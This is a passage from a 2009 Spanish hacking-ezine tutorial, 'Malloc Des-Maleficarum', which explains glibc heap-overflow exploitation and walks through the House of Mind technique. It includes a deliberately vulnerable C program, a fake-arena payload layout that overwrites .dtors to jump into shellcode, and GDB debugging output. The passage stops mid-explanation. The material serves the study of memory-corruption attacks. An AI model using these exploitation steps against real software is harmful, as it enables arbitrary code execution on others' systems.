@@ -1,0 +1,2724 @@
+-[ 0x02 ]--------------------------------------------------------------------
+-[ Malloc Des-Maleficarum ]--------------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-38--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         <blackngel1@gmail.com>
+          ||         <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+--[ INDICE
+
+
+ 1 - Historia
+
+ 2 - Introduccion
+
+ 3 - Viaje al Pasado
+
+ 4 - DES-Maleficarum...
+
+	4.1 - The House of Mind
+
+		4.1.1 - Metodo FastBin
+		4.1.2 - Pesadilla av->top
+
+	4.2 - The House of Prime
+
+		4.2.1 - unsorted_chunks()
+
+	4.3 - The House of Spirit
+
+	4.4 - The House of Force
+
+		4.4.1 - Errores
+
+	4.5 - The House of Lore
+
+	4.6 - The House of Underground
+
+ 5 - ASLR y Nonexec Heap (El Futuro)
+
+ 6 - The House of Phrack
+
+ 7 - Referencias
+
+
+--[ FIN INDICE
+
+
+
+          "Traduitori son tratori" -> "Translators are traitors"
+
+
+
+           -----------------
+---[ 1 ---[   LA HISTORIA   ]---
+           -----------------
+
+El 11 de Agosto del 2001, aparecieron dos articulos en la e-zine Phrack
+que vinieron a dar un avance en el mundo de la explotacion. Por su parte,
+MaXX documentaba en su articulo "Vudo malloc tricks" [1] la implementacion
+basica y algoritmos de la libreria GNU C, "malloc( )" de Doug Lea, y
+presentaba varios metodos que permitian llegar a ejecucion de codigo
+arbitrario a traves de overflows en el heap (monticulo). Al mismo tiempo,
+mostraba un ejemplo real de explotacion del programa "sudo".
+
+En el mismo numero de Phrack, un personaje anonimo publicaba un articulo
+del mismo calibre, llamado "Once upon a free()" [2], que a diferencia del
+anterior se extendia explicando la "implementacion malloc de System V".
+
+El 13 de Agosto del 2003, "jp <jp@corest.com>", desarrollo de un modo mas
+avanzado las tecnicas iniciadas en los textos previos. Su articulo, llamado
+"Advanced Doug Lea's malloc exploits" [3], tal vez fuera el apoyo más
+grande a lo que estaba por venir...
+
+Las tecnicas publicadas en el primero de los articulos, conocidas como:
+
+- Tecnica "unlink()"
+- Tecnica "frontlink()"
+
+...fueron aplicables hasta el año 2004, momento en que la biblioteca GLIBC
+fue parcheada a tales fines y, para desgracia de algunos, dejaron de surtir
+efecto.
+
+Pero no todo estaba dicho con respecto a este tema. El 11 de Octubre del
+2005, un tal Phantasmal Phantasmagoria publicaba en la lista "bugtraq"
+un articulo cuyo nombre provoca un profundo misterio: "Malloc Maleficarum"
+[4].
+
+Nombre, por cierto, que resultaba de una variacion de un texto antiquisimo
+llamado "Malleus Maleficarum" (El martillo de las brujas)...
+
+Phantasmal tambien fue el autor del fantastico articulo "Exploiting the
+Wilderness" [5], quizas el trozo mas temido en principio por los amantes
+del heap.
+
+Malloc Maleficarum, era una presentacion completamente teorica de lo que
+podrian llegar a ser las nuevas tecnicas de explotacion con respecto al
+ambito de los heap overflows. Su autor dividio cada una de las tecnicas
+titulandolas de la siguiente manera:
+
+   The House of Prime
+   The House of Mind
+   The House of Force
+   The House of Lore
+   The House of Spirit
+   The House of Chaos (conclusion)
+
+Y desde luego fue la revolucion que abrio de nuevo las mentes cuando las
+puertas se habian cerrado.
+
+El unico defecto de este articulo es que no mostraba prueba de concepto
+alguna que demostrara que todas y cada una de las tecnicas eran posibles.
+Quizas las implementaciones quedaron en el "background", o tal vez en
+circulos cerrados.
+
+El caso es que el 1 de enero del 2007, en la revista electronica ".aware
+eZine Alpha", un tal K-sPecial publico un articulo llamado simplemente
+"The House of Mind" [6]. Este articulo vino a pronunciar en primera
+instancia la minuscula falta que habia tenido el articulo de Phantasmal y,
+por otro lado, solucionarlo presentando una prueba de concepto continuada
+con su correspondiente exploit.
+
+Por otro lado, el paper de K-sPecial sacaba a la luz un par de matices en
+los cuales Phantasmal habia errado en su interpretacion de la tecnica que
+el mismo titulo del articulo describe.
+
+Para terminar, el 25 de mayo del 2007, g463 publico en Phrack un articulo
+llamado: "The use of set_head to defeat the wilderness" [7]. El describio
+como lograr la premisa "write almost 4 arbitrary bytes to almost anywhere"
+explotando un bug existente en la aplicacion "file(1)". Hasta ahora este
+ha sido el avance mas reciente en lo que concierne a Heap Overflows en
+sistemas Linux.
+
+
+
+              << En todas las actividades es saludable, de vez
+                 en cuando, poner un signo de interrogacion
+                 sobre aquellas cosas que por mucho tiempo se
+                 han dado como seguras. >>
+
+                                          [ Bertrand Russell ]
+
+
+
+           ------------------
+---[ 2 ---[   INTRODUCCION   ]---
+           ------------------
+
+Podriamos definir este articulo como "El Manual Practico del Malloc
+Maleficarum". Y efectivamente, nuestro principal objetivo es desmalificar
+y/o desmitificar la mayoria de las tecnicas descritas en este paper a
+traves de ejemplos practicos (tanto los programas vulnerables como sus
+correspondientes exploits).
+
+Por otro lado, y muy importante, se intentaran corregir ciertos errores
+que fueron objeto de mala interpretacion en Malloc Maleficarum. Errores
+que resultan hoy en dia mas faciles de ver gracias al enorme trabajo que
+Phantasmal nos regalo en su momento. El es un experto, un "experto virtual"
+por supuesto...
+
+Es debido a estos errores, que en este articulo se presentan nuevas
+aportaciones al mundo de los heap overflow bajo Linux, introduciendo
+variaciones en las tecnicas presentadas por Phantasmal, asi como ideas
+totalmente nuevas que podrian permitir ejecuciones de codigo arbitrario
+mas directas.
+
+Aunque suena demasiado atrevido decir lo siguiente, mi mayor alegria al
+escribir este articulo y publicarlo se desprende del sentimiento que uno
+obtiene al resolver problemas que fueron planteados en el pasado. Dentro
+del mundo de las matematicas, seria como la plenitud alcanzada por Andrew
+Wiles cuando dio solucion al "Ultimo Teorema de Fermat", o como lo que
+ocurrira si algun dia se demuestra la increiblemente famosa "Conjetura
+de Goldbach" o cualquier adelanto en la "Hipotesis de Riemann". Desde este
+punto, puede verse al "Malloc Des-Maleficarum" como la demostracion
+definitiva del "Malloc Maleficarum", una teoria que bien pudiera verse como
+una conjetura, y que tras esta publicacion podria transformarse finalmente
+en un Teorema de Pleno Derecho.
+
+En resumen, tu veras en este articulo:
+
+ - Modificacion mas limpia del exploit de K-sPecial en The House of Mind.
+ - Implementacion renovada del metodo "fastbin" en The House of Mind.
+ - Implementacion practica de la tecnica The House of Prime.
+ - Nueva idea para ejecucion directa de codigo arbitrario en el metodo
+   unsorted_chunks() en The House of Prime.
+ - Implementacion practica de la tecnica The House of Spirit.
+ - Implementacion practica de la tecnica The House of Force.
+ - Recapitulacion de errores en la teoria de The House of Force cometidos
+   en el Malloc Maleficarum.
+ - Acercamiento teorico/practico a The House of Lore.
+
+A lo largo de este articulo iremos mostrando tambien algunos caminos
+imposibles, lo cual te incitara a continuar investigando en el area y
+a la vez evitara que pierdas tu tiempo estudiando puntos muertos.
+
+Por lo demas, para un conocimiento general de la implementacion de la
+libreria "malloc de Doug Lea", recomiendo dos cosas:
+
+1) Leer primero el articulo de MaXX [1].
+2) Descargar y leer el codigo fuente de GLIBC-2.3.6 [8]
+   (malloc.c y arena.c).
+
+NOTA  : Salvo para The House of Prime, yo he utizado una distribucion
+        Linux x86, bajo un kernel 2.6.24-23, con la version 2.7 de GLIBC,
+        lo que demuestra que estas tecnicas todavia son aplicables en la
+        actualidad.
+
+NOTA 2: En la actualidad la implementacion malloc de Doug Lea es conocida
+        como "ptmalloc" que es una implementacion basada en la anterior,
+        creacion de Wolfram Gloger. GLIBC 2.7 == ptmalloc2. Para obtener
+        mas informacion puedes visitar este lugar [9].
+
+Como no, seria conveniente tener a tu lado la teoria de Phantasmal como
+apoyo a las sucesivas tecnicas que seran aplicadas. No obstante, los
+conceptos descritos en este articulo deberian ser suficientes para una
+casi completa compresion del tema.
+
+En este articulos veras, a traves de las brujas, como todavia quedan
+caminos por recorrer. Y podemos ir juntos...
+
+
+
+                   << Lo que conduce y arrastra
+                      al mundo no son las maquinas,
+                      sino las ideas. >>
+
+                                    [ Victor Hugo ]
+
+
+
+           ---------------------
+---[ 3 ---[   VIAJE AL PASADO   ]---
+           ---------------------
+
+Por que la tecnica "unlink()" dejo de ser aplicable?
+
+"unlink()" presuponia que, si dos trozos eran asignados en el heap, y el
+segundo era vulnerable de ser sobreescrito a traves de un overflow del
+primero, un tercer trozo falso podia ser creado y de este modo engañar a
+"free()" para que procediera a desenlazar este segundo trozo y unirlo con
+el primero.
+
+Este desenlace se producia con el siguiente codigo:
+
+   #define unlink( P, BK, FD ) {            \
+       BK = P->bk;                          \
+       FD = P->fd;                          \
+       FD->bk = BK;                         \
+       BK->fd = FD;                         \
+   }
+
+Siendo P el segundo trozo alterado, "P->fd" se modificaba para apuntar
+a una zona de memoria susceptible de ser sobreescrita (como .dtors) - 12.
+Si "P->bk" apuntaba entonces a la direccion de un Shellcode situado en la
+memoria por un exploiter (tal vez ENV o el mismo primer trozo), entonces
+esta direccion seria escrita en el 3er paso de unlink(), en "FD->bk" que
+resultaba ser:
+
+   "FD->bk" = "P->fd" + 12 = ".dtors".
+   ".dtors" -> &(Shellcode)
+
+En realidad, en caso de utilizar DTORS, "P->fd" deberia apuntar a
+.dtors+4-12 de tal forma que "FD->bk" apunte finalmente a DTORS_END,
+que sera ejecutado en la salida del programa. GOT tambien es un buen
+objetivo o un puntero de funcion o mas cosas...
+
+Y aqui empezaba la diversion!
+
+Tras la aplicacion de los correspondientes parches en GLIBC, el codigo
+de la macro "unlink()" se muestra como sigue:
+
+   #define unlink(P, BK, FD) {                                            \
+     FD = P->fd;                                                          \
+     BK = P->bk;                                                          \
+     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
+       malloc_printerr (check_action, "corrupted double-linked list", P); \
+     else {                                                               \
+       FD->bk = BK;                                                       \
+       BK->fd = FD;                                                       \
+     }                                                                    \
+   }
+
+Si "P->fd", que apunta al siguiente trozo (FD), NO es modificado, entonces
+el puntero de regreso "bk" de FD debe apuntar a su vez a P. Lo mismo ocurre
+con el trozo anterior (BK)... si "P->bk" apunta al trozo anterior, entonces
+el puntero "forward" de BK debe apuntar a P. En cualquier otro caso,
+significara un error en la lista doblemente enlazada y por ende que el
+segundo trozo (P) ha sido hackeado. 
+
+Y aqui terminaba la diversion!
+
+
+
+                  << Nuestra tecnica no solo produce artefactos,
+                     esto es, cosas que la naturaleza no produce,
+                     sino tambien las cosas mismas que la naturaleza
+                     produce y dotadas de identica actividad
+                     natural. >>
+
+                                                   [ Xavier Zubiri ]
+
+
+
+           ------------------------
+---[ 4 ---[   DES-MALEFICARUM...   ]---
+           ------------------------
+
+Lee atentamente lo que viene a continuacion. Solo espero que al final de
+este articulo, las brujas hayan desaparecido por completo.
+
+O... por mi... mejor que se aparezcan, ¿no?
+
+
+
+             -----------------------
+---[ 4.1 ---[   THE HOUSE OF MIND   ]---
+             -----------------------
+
+Seguiremos aqui la tecnica "The House of Mind" paso a paso de modo que
+aquellos que se inician en estas lindes no encuentren demasiadas espinas
+en el camino... un camino que ya de por si puede resultar algo duro.
+
+Tampoco esta de mas mostrar una segunda vision/opinion acerca de como
+desarrollar el exploit, que en mi caso particular sufrio una pequeña
+variacion de comportamiento (se vera mas adelante).
+
+La comprension de esta tecnica se volvera mucho mas sencilla si por alguna
+casualidad demuestro la habilidad de saber mostrar los pasos con cierto
+orden; de otro modo la mente ira de un lado hacia otro, pero... probemos
+suerte!
+
+"The House of Mind" es descrita quizas como la tenica mas facil o al menos
+amigable con respecto a lo que en su momento fue "unlink()". Dos variantes
+de explotacion fueron presentadas. Veamos aqui la primera de ellas:
+
+Consigna: Solo una llamada a "free()" es necesaria para provocar la
+          ejecucion de codigo arbitrario.
+
+NOTA: A partir de aqui tendremos siempre en mente que "free()" es ejecutado
+      sobre un segundo trozo que puede ser overfloweado por otro trozo que
+      ha sido declarado antes.
+
+Segun "malloc.c", una llamada a free() desencadena la ejecucion de un
+wrapper (en la jerga "funciones envoltorio") llamado "public_fREe()".
+
+Aqui el codigo relevante:
+
+   void
+   public_fREe(Void_t* mem)
+   {
+       mstate ar_ptr;
+       mchunkptr p;        /* chunk corresponding to mem */
+       ...
+       p = mem2chunk(mem);
+       ...
+       ar_ptr = arena_for_chunk(p);
+       ...
+       _int_free(ar_ptr, mem);
+   }
+
+Una llamada a "malloc(x)" retorna, siempre que todavia quede memoria
+disponible, un puntero a la zona de memoria donde los datos pueden ser
+almacenados, movidos, copiados, etc...
+
+Imaginemos por ejemplo que dado "char *ptr = (char *) malloc(512);"
+devuelve la direccion "0x0804a008". Esta direccion es la que "mem"
+contiene cuando "free()" es llamado.
+
+La funcion mem2chunk(mem) devuelve un puntero a la direccion donde comienza
+el trozo (no la zona de datos, sino el principio del chunk), que en un
+trozo asignado es algo como:
+
+   &mem - sizeof(size) - sizeof(prev_size) = &mem - 8.
+
+   p = (0x0804a000);
+
+"p" es enviado entonces a la macro "arena_for_chunk()", que segun
+"arena.c", desencadena lo siguiente:
+
+
+   #define HEAP_MAX_SIZE (1024*1024) /* must be a power of two */
+                    _____________________________________________
+                   |                                             |
+   #define heap_for_ptr(ptr) \                                   |
+      ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1))) |
+                                                                 |
+   #define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)  |
+  __________________|                         ___________________|
+ |                                           |
+ | #define arena_for_chunk(ptr) \            |
+ |___(chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena)
+
+
+Como vemos, "p", que ahora es "ptr", se pasa a "chunk_non_main_arena()"
+que se encarga de comprobar si el campo "size" de este trozo tiene el
+tercer bit menos significativo activado (NON_MAIN_ARENA = 4h = 100b).
+
+En un trozo no alterado, esta funcion retornara "false" y la direccion
+de "main_arena" sera devuelta por "arena_for_chunk()". Pero... por suerte,
+dado que nosotros podemos alterar el campo "size" del trozo "p", y hacer
+que este bit SI este activado, entonces podemos engañar "arena_for_chunk()"
+para que "heap_for_ptr()" sea llamado.
+
+Ahora estamos en:
+
+   (heap_info *) ((unsigned long)(0x0804a000) & ~(HEAP_MAX_SIZE-1)))
+   
+   entonces:
+
+   (heap_info *) (0x08000000)
+
+Debemos fijarnos que "heap_for_ptr()" es una macro y no una funcion, de
+vuelta a "arena_for_chunk()" tendriamos:
+
+   (0x08000000)->ar_ptr
+
+Este "ar_ptr" es el primer miembro de una estructura "heap_info" que se
+ve asi:
+
+   typedef struct _heap_info {
+     mstate ar_ptr; /* Arena for this heap. */
+     struct _heap_info *prev; /* Previous heap. */
+     size_t size;   /* Current size in bytes. */
+     size_t pad;    /* Make sure the following data is properly aligned. */
+   } heap_info;
+
+De modo que lo que se esta buscando en (0x08000000) es la direccion de
+una "arena". Una "arena" es una estructura que sera definida en breve.
+Por el momento, lo que podemos decir, es que en (0x08000000) no hay
+ninguna direccion que apunte a ninguna "arena", de modo que el programa
+rompera proximamente con un fallo de segmentacion.
+
+Parece que aqui se acaba nuestra jugada, ya que como nuestro primer trozo
+esta un poco por detras del segundo (0x0804a000) (pero no mucho mas), este
+solo nos permite sobreescribir hacia adelante, impidiendo que podamos
+escribir nada en (0x08000000).
+
+Pero esperen un momento... que ocurre si pudieramos sobreescribir un
+trozo con una direccion como esta: (0x081002a0)?
+
+Si nuestro primer trozo estuviera en (0x0804a000), podemos sobreescribir
+hacia adelante y colocar en (0x08100000) una direccion arbitraria
+(normalmente el principio de la zona de datos de nuestro primer trozo).
+
+Entonces "heap_for_ptr(ptr)->ar_ptr" tomaria esta direccion, y...
+
+ return heap_for_ptr(ptr)->ar_ptr | ret (0x08100000)->ar_ptr = 0x0804a008
+ -------------------------------- | --------------------------------------
+ ar_ptr = arena_for_chunk(p);     | ar_ptr = 0x0804a008
+ ...                              | ...
+ _int_free(ar_ptr, mem);          | _int_free(0x0804a008, 0x081002a0);
+
+Piensa que como podemos modificar "ar_ptr" a nuestro antojo podriamos hacer
+que apuntara a una variable de entorno o cualquier otro sitio. Lo principal
+es que en esa direccion de memoria, "_int_free()" espera encontrar una
+estructura "arena". Veamos ahora...
+
+   mstate ar_ptr;
+
+"mstate" es en realidad un tipo de estructura "malloc_state"
+(sin comentarios):
+
+   struct malloc_state {
+     mutex_t mutex;
+     INTERNAL_SIZE_T  max_fast;   /* low 2 bits used as flags */
+     mfastbinptr      fastbins[NFASTBINS];
+     mchunkptr        top;
+     mchunkptr        last_remainder;
+     mchunkptr        bins[NBINS * 2];
+     unsigned int     binmap[BINMAPSIZE];
+     ...
+     INTERNAL_SIZE_T system_mem;
+     INTERNAL_SIZE_T max_system_mem;
+   };
+   ...
+   static struct malloc_state main_arena;
+
+Pronto nos sera de ayuda conocer esto. El objetivo de "The House of Mind"
+es alcanzar la siguiente porcion de codigo en la llamada "_int_free()":
+
+   void _int_free(mstate av, Void_t* mem) {
+      .....
+      bck = unsorted_chunks(av);
+      fwd = bck->fd;
+      p->bk = bck;
+      p->fd = fwd;
+      bck->fd = p;
+      fwd->bk = p;
+      .....
+   }
+
+Esto ya se empieza a parecer un poco mas a "unlink()".
+
+Ahora "av" tiene el valor de "ar_ptr" que se supone es el comienzo de
+una estructura "arena". Mas... "unsorted_chunks()", segun Phantasmal
+Phantasmagoria, devolvia el valor de "av->bins[0]". Ya que "av" es
+(0x0804a008) (el principio de nuestro buffer), y nosotros podemos escribir
+de ahi en adelante, podemos controlar el valor de bins[0], una vez pasados
+los campos: mutex, max_fast, fastbins[] y top. Lo cual es sencillo...
+
+Phantasmal nos indicaba que, si ponemos en av->bins[0] la direccion de
+".dtors" menos 8, entonces la penultima instruccion escribiria en esta
+direccion + 8 la direccion del trozo overfloweado "p". En esta direccion
+se encuentra el campo "prev_size" y como ahi podemos colocar cualquier
+cosa, por ejemplo un "jmp", entonces podemos saltar a un shellcode situado
+un poco mas adelante y ya sabes como sigue...
+
+   p = 0x081002a0 - 8;
+   ...
+   bck = .dtors + 4 - 8
+   ...
+   bck + 8 = DTORS_END = 0x08100298
+
+   1er Trozo     -bins[0]-                     2do Trozo
+   [ .......... .dtors+4-8 ] [0x0804a008 ... ] [jmp 0xc ...... (Shellcode)] 
+   |                         |                 |
+   0x0804a008                0x08100000        0x08100298
+
+Cuando el programa termina se ejecuta DTORS, por lo tanto el salto, y por
+lo tanto nuestra shellcode.
+
+Y aunque la idea era buena, K-sPecial nos advirtio que "unsorted_chunks()"
+no devolvia en realidad el valor de "av->bins[0]", sino su direccion "&".
+Echemos un vistazo:
+
+   #define bin_at(m, i) ((mbinptr)((char*)&((m)->bins[(i)<<1]) - 
+                                                (SIZE_SZ<<1)))
+   ...
+   #define unsorted_chunks(M)          (bin_at(M, 1))
+
+Efectivamente, vemos que "bin_at()" devuelve la direccion y no el valor.
+Por lo tanto otro camino debe ser tomado. Teniendo lo anterior en mente
+tenemos que:
+
+   bck = &av->bins[0];                  /* Direccion de ...  */
+   fwd = bck->fd = &av->bins[0] + 8;    /* Lo que hay en ... */
+   fwd->bk = *(&av->bins[0] + 8) + 12 = p;
+
+Lo cual quiere decir que, si hacemos que el valor situado en:
+"&av->bins[0] + 8" sea ".dtors + 4 - 12", esto sera puesto en fwd,
+y en la ultima instruccion sera escrito en DTORS_END la direccion
+del segundo trozo "p", y se prosigue como en el caso anterior.
+
+Pero nosotros hemos saltado aqui sin atravesar el camino lleno de
+espinas. Nuestro amigo Phantasmal nos advirtio tambien que para
+llegar a ejecutar este trozo de codigo, ciertas condiciones deberian
+ser cumplidas. Veremos ahora cada una de ellas relacionada con su
+porcion de codigo correspondiente en la funcion "_int_free()".
+
+   1) El valor "negativo" del tamaño del trozo sobreescrito
+      debe ser menor que el propio valor de ese trozo "p".
+
+      if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0) ...
+
+   ATENCION: Esto debe ser una mala interpretacion del lenguaje. Con el
+             objetivo de saltarse este condicional: "-size" debe ser
+             "mayor" que el valor de "p".
+
+   2) El tamaño del trozo no debe ser menor o igual que av->max_fast.
+
+      if ((unsigned long)(size) <= (unsigned long)(av->max_fast) ...
+
+   Controlamos tanto el tamaño del trozo overfloweado como "av->max_fast",
+   que es el segundo campo de nuestra estructura "arena" falseada.
+
+   3) El bit IS_MMAPPED no debe estar activado en el campo "size".
+
+      else if (!chunk_is_mmapped(p)) { ...
+
+   Tambien controlamos el segundo bit menos significativo del campo "size".
+
+   4) El trozo sobreescrito no puede ser av->top (trozo mas alto).
+
+      if (__builtin_expect (p == av->top, 0)) ...
+
+   5) av->max_fast debe tener el bit NONCONTIGUOUS_BIT activado.
+
+      if (__builtin_expect (contiguous (av) ...
+
+   Nosotros controlamos "av->max_fast" y sabemos que NONCONTIGUOUS_BIT
+   es igual a "0x02" = "10b".
+
+   6) El bit PREV_INUSE del siguiente trozo debe estar activado.
+
+      if (__builtin_expect (!prev_inuse(nextchunk), 0)) ...
+
+   Como nuestro trozo es un trozo "asignado", esta condicion se cumple
+   por defecto.
+
+   7) El tamaño del siguiente trozo debe ser mas grande que 8.
+
+      if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0) ...
+
+   8) El tamaño del siguiente trozo debe ser menor que av->system_mem.
+
+      ... __builtin_expect (nextsize >= av->system_mem, 0)) ...
+
+   9) El bit PREV_INUSE del trozo "no" debe estar activado.
+
+      /* consolidate backward */
+      if (!prev_inuse(p)) { ...
+
+  ATENCION: Phantasmal parece equivocarse aqui, al menos segun mi
+            opinion, el bit PREV_INUSE del trozo sobreescrito "SI"
+            debe estar activado, para saltarse de este modo el
+            proceso de "desenlace" (unlink()) del trozo anterior.
+
+  10) El siguiente trozo "no" puede ser igual a av->top.
+
+      if (nextchunk != av->top) { ...
+
+  Si alteramos toda la informacion desde "av->fastbins[]" hasta
+  "av->bins[0]", "av->top" sera sobreescrito y sera casi imposible
+  que sea igual a "nextchunk". 
+
+  11) El bit PREV_INUSE del trozo colocado depues
+      del siguiente trozo, debe de estar activado.
+
+      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+      /* consolidate forward */
+      if (!nextinuse) { ...
+
+El camino parece largo y tortuoso, pero no lo es tanto cuando podemos
+controlar la mayoria de las situaciones. Veamos el programa vulnerable
+que presento nuestro amigo K-sPecial:
+
+[-----]
+
+/*
+ * K-sPecial's vulnerable program
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main (void) {
+   char *ptr  = malloc(1024);        /* Primer trozo reservado */
+   char *ptr2;                       /* Segundo trozo          */
+   /* ptr & ~(HEAP_MAX_SIZE-1) = 0x08000000 */
+   int heap = (int)ptr & 0xFFF00000;
+   _Bool found = 0;
+
+   printf("ptr found at %p\n", ptr);  /* Imprime direccion 1er trozo */
+
+   // i == 2 because this is my second chunk to allocate
+   for (int i = 2; i < 1024; i++) {
+      /* Asigna trozos hasta una direccion superior a 0x08100000 */
+     if (!found && (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == \
+                                           (heap + 0x100000))) {
+       printf("good heap allignment found on malloc() %i (%p)\n", i, ptr2);
+          found = 1; /* Sale si lo alcanza */
+          break;
+       }
+
+   }
+        malloc(1024); /* Asigna otro trozo mas: (ptr2 != av->top) */
+        /* Llamada vulnerable: 1048576 bytes */
+        fread (ptr, 1024 * 1024, 1, stdin); 
+
+        free(ptr);   /* Libera el primer trozo            */
+        free(ptr2);  /* Aqui se produce The House of Mind */
+        return(0);   /* Bye */
+}
+
+[-----]
+
+Es de notar que la entrada permite bytes NULL sin que finalice la cadena.
+Esto facilita nuestra tarea.
+
+El exploit de K-sPecial crea la siguiente cadena:
+
+[-----]
+
+ 0x0804a008
+ |
+ [Ax8][0h x 4][201h x 8][DTORS_END-12 x 246][(409h-Ax1028) x 721][409h] ...
+              |                   |
+              av->max_fast        bins[0]      size
+                                               |
+ .... [(&1er trozo + 8) x 256][NOPx2-JUMP 0x0c][40Dh][NOPx8][SHELLCODE]
+              |               |                      |
+              0x08100000      prev_size (0x08100298) *mem (0x081002a0)
+
+[-----]
+
+1) La primera llamada a free() sobreescribe los 8 primeros bytes con
+   basura, entonces K-sPecial prefiere saltarse esta zona y poner en
+   (0x08100000) la direccion de la zona de datos del primer trozo + 8
+   (0x0804a010). Ahi comienza la estructura "arena" falseada.
+
+2) Luego viene "\x00\x00\x00\x00" que rellena el miembro "av->mutex".
+   Otro valor provocara que el exploit falle.
+
+3) "av->max_fast" toma el valor "102h". Cumple las condiciones 2 y 5.
+   2) (size > max_fast) -> (40Dh > 102h)
+   5) "\x02" Activamos NONCONTIGUOUS_BIT
+
+4) Terminamos de llenar el primer trozo con la direccion de
+   DTORS_END(.dtors+4) menos 8. Esto sobreescribira &av->bins[0] + 8.
+
+5) Rellenamos el resto de trozos sin pasar de (0x08100000), con caracteres
+   "A", pero conservando el campo "size" (409h)de cada uno de los trozos.
+   Cada uno tiene el bit PREV_INUSE activado.
+
+6) Hasta alcanzar el principio del trozo sobreescrito "p", llenamos con
+   la direccion donde se encuentra nuestra "arena" falsa, que es la
+   direccion del primer trozo mas 8 para saltar los bytes de basura que
+   seran sobreescritos.
+
+7) El campo "prev_size" de "p" contendra "nop; nop; jmp 0x0c;" para saltar
+   a nuestro shellcode cuando DTORS_END sea llamado al final del programa.
+
+8) El campo "size" de "p" debe ser mayor que el valor escrito en
+   "av->max_fast" y ademas tener el bit NON_MAIN_ARENA activado,
+   el cual fue el desencadenante de toda esta historia en The House
+   of Mind.
+
+9) Unos cuantos NOPS y seguidamente nuestro SHELLCODE.
+
+Despues de comprender unas ideas tan solidas, me quede realmente
+sorprendido cuando una ejecucion del exploit producia lo siguiente:
+
+blackngel@linux:~$ ./exploit > file
+blackngel@linux:~$ ./heap1 < file
+ptr found at 0x804a008
+good heap allignment found on malloc() 724 (0x81002a0)
+*** glibc detected *** ./heap1: double free or corruption (out): 0x081002a0
+...
+
+En malloc.c este error se corresponde con la condicion:
+
+   if (__builtin_expect (contiguous (av)
+
+Veamos que ocurre con GDB:
+
+[-----]
+
+blackngel@linux:~$ gdb -q ./heap1
+(gdb) disass main
+Dump of assembler code for function main:
+.....
+.....
+0x08048513 <main+223>:	call   0x804836c <free@plt>
+0x08048518 <main+228>:	mov    -0x10(%ebp),%eax
+0x0804851b <main+231>:	mov    %eax,(%esp)
+0x0804851e <main+234>:	call   0x804836c <free@plt>
+0x08048523 <main+239>:	mov    $0x0,%eax
+0x08048528 <main+244>:	add    $0x34,%esp
+0x0804852b <main+247>:	pop    %ecx
+0x0804852c <main+248>:	pop    %ebp
+0x0804852d <main+249>:	lea    -0x4(%ecx),%esp
+0x08048530 <main+252>:	ret    
+End of assembler dump.
+(gdb) break *main+223             /* Antes del primer free()   */
+Breakpoint 1 at 0x8048513
+(gdb) break *main+228             /* Despues del primer free() */
+Breakpoint 2 at 0x8048518
+(gdb) run < file
+Starting program: /home/blackngel/heap1 < file
+ptr found at 0x804a008
+good heap allignment found on malloc() 724 (0x81002a0)
+
+Breakpoint 1, 0x08048513 in main ()
+Current language:  auto; currently asm
+(gdb) x/16x 0x0804a008
+0x804a008:	0x41414141	0x41414141	0x00000000	0x00000102
+0x804a018:	0x00000102	0x00000102	0x00000102	0x00000102
+0x804a028:	0x00000102	0x00000102	0x00000102	0x08049648
+0x804a038:	0x08049648	0x08049648	0x08049648	0x08049648
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048518 in main ()
+(gdb) x/16x 0x0804a008
+0x804a008:	0xb7fb2190	0xb7fb2190	0x00000000	0x00000000
+0x804a018:	0x00000102	0x00000102	0x00000102	0x00000102
+0x804a028:	0x00000102	0x00000102	0x00000102	0x08049648
+0x804a038:	0x08049648	0x08049648	0x08049648	0x08049648
+
+[-----]
+
+Cuando el programa se detiene antes del primer free(), podemos ver como
+nuestro buffer parece estar bien formado: [A x 8][0000][102h x 8].
+
+Pero una vez la llamada del primer free() es completada, como dijimos, los
+primeros 8 bytes son destrozados con direcciones de memoria. Lo mas
+sorprendente es que la posicion de memoria 0x0804a0010(av) + 4, es puesta
+a cero (0x00000000).
+
+Esta posicion deberia ser "av->max_fast", que al ser cero, y no tener
+activado el bit NONCONTIGUOUS_BIT, vuelca el error anterior. Esto parece
+tener que ver con la siguiente instruccion:
+
+   # define mutex_unlock(m)            (*(m) = 0)
+
+... que es ejecutada al final de "_int_free()" con:
+
+   (void *)mutex_unlock(&ar_ptr->mutex);
+
+Sea como fuere, y ya que alguien pone un 0 por nosotros. Que ocurre si
+hacemos que ar_ptr apunte a 0x0804a014?
+
+(gdb) x/16x 0x0804a014
+                // Mutex       // max_fast ?
+0x804a014:	0x00000000	0x00000102	0x00000102	0x00000102
+0x804a024:	0x00000102	0x00000102	0x00000102	0x00000102
+0x804a034:	0x08049648	0x08049648	0x08049648	0x08049648
+0x804a044:	0x08049648	0x08049648	0x08049648	0x08049648
+
+De modo que podemos ahorrarnos en el exploit los 8 bytes de basura y el
+valor manual del "mutex" y dejar que free() haga por nosotros el resto.
+
+[-----]
+
+blackngel@mac:~$ gdb -q ./heap1
+(gdb) run < file
+Starting program: /home/blackngel/heap1 < file
+ptr found at 0x804a008
+good heap allignment found on malloc() 724 (0x81002a0)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x081002b2 in ?? ()
+(gdb) x/16x 0x08100298
+0x8100298:	0x90900ceb	0x00000409	0x08049648	0x0804a044
+0x81002a8:	0x00000000	0x00000000	0x5bf42474	0x5e137381
+0x81002b8:	0x83426ac9	0xf4e2fceb	0xdb32c234	0x6f02af0c
+0x81002c8:	0x2a8d403d	0x4202ba71	0x2b08e636	0x10894030
+(gdb) 
+
+[-----]
+
+Parece que el segundo trozo "p" sufre de nuevo la colera de free().
+PREV_SIZE esta OK, SIZE esta OK, pero los 8 NOPS son destrozados con
+dos direcciones de memoria y 8 bytes NULL.
+
+Ten en cuenta que tras la llamada a "unsorted_chunks()", tenemos dos
+sentencias como estas:
+
+      p->bk = bck;
